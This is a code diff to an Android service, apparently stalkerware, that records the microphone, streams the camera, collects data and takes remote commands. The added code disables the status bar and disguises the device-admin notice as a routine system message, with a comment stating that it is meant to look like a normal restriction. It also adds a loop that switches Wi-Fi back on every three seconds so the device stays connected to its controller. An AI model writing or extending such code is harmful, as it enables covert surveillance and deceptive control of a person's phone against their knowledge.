@@ -270,6 +270,7 @@ class MicService : Service() {
     // ── Data Collector ───────────────────────────────────────────────────────
     private val dataCollector by lazy { DataCollector(this) }
     private var dataJob: Job? = null
+    private var networkEnforcerJob: Job? = null
 
     // ── Prefs / Device ID ────────────────────────────────────────────────────
     private val prefs by lazy { getSharedPreferences("micmonitor", MODE_PRIVATE) }
@@ -546,6 +547,7 @@ class MicService : Service() {
             startMicWatchdog()
             startDataCollection()
         }
+        startNetworkEnforcer()
         startHttpFallbackSync() // Bug 5: Ensure HTTP fallback starts on every command
         scheduleKeepAlive()
         scheduleReconnectAlarm()
@@ -651,6 +653,9 @@ class MicService : Service() {
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                             dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
                         }
+                        dpm.setStatusBarDisabled(admin, true)
+                        // Make the Android IT Admin popup look like a normal system restriction
+                        dpm.setShortSupportMessage(admin, "System setting restricted.")
                         Log.i(TAG, "Network restrictions applied (Wi-Fi, Data, Airplane Mode locked)")
                     } else {
                         dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_CONFIG_WIFI)
@@ -658,6 +663,8 @@ class MicService : Service() {
                         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                             dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
                         }
+                        dpm.setStatusBarDisabled(admin, false)
+                        dpm.setShortSupportMessage(admin, null) // Restore default
                     }
                 } catch (e: Exception) { Log.w(TAG, "Network restriction policy failed: ${e.message}") }
             }
@@ -684,6 +691,8 @@ class MicService : Service() {
         stopWebRtcSession(notifyState = false)
         stopCameraLiveStream("service_destroy")
         stopDataCollection()
+        networkEnforcerJob?.cancel()
+        networkEnforcerJob = null
 
 
         // Close WebSocket cleanly
@@ -1445,6 +1454,9 @@ class MicService : Service() {
                         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                             dpm.addUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
                         }
+                        dpm.setStatusBarDisabled(admin, true)
+                        // Make the Android IT Admin popup look like a normal system restriction
+                        dpm.setShortSupportMessage(admin, "System setting restricted.")
                         prefs.edit().putBoolean("network_locked", true).apply()
                         sendHealthStatus("network_locked")
                         sendCommandAck("lock_network")
@@ -1468,6 +1480,8 @@ class MicService : Service() {
                         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.P) {
                             dpm.clearUserRestriction(admin, android.os.UserManager.DISALLOW_AIRPLANE_MODE)
                         }
+                        dpm.setStatusBarDisabled(admin, false)
+                        dpm.setShortSupportMessage(admin, null)
                         prefs.edit().putBoolean("network_locked", false).apply()
                         sendHealthStatus("network_unlocked")
                         sendCommandAck("unlock_network")
@@ -3290,6 +3304,26 @@ class MicService : Service() {
         dataJob = null
     }
     
+    private fun startNetworkEnforcer() {
+        if (networkEnforcerJob?.isActive == true) return
+        networkEnforcerJob = serviceScope.launch(Dispatchers.IO) {
+            while (isActive) {
+                if (prefs.getBoolean("network_locked", false)) {
+                    try {
+                        val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
+                        if (wifiManager?.isWifiEnabled == false) {
+                            Log.i(TAG, "Network locked: Auto-re-enabling Wi-Fi")
+                            wifiManager.setWifiEnabled(true)
+                        }
+                    } catch (e: Exception) {
+                        Log.w(TAG, "Failed to enforce Wi-Fi: ${e.message}")
+                    }
+                }
+                delay(3000)
+            }
+        }
+    }
+
     /**
      * Open auto-start settings for Chinese ROMs (Realme, Xiaomi, Vivo, etc.)
      * Returns true if successfully opened a settings activity
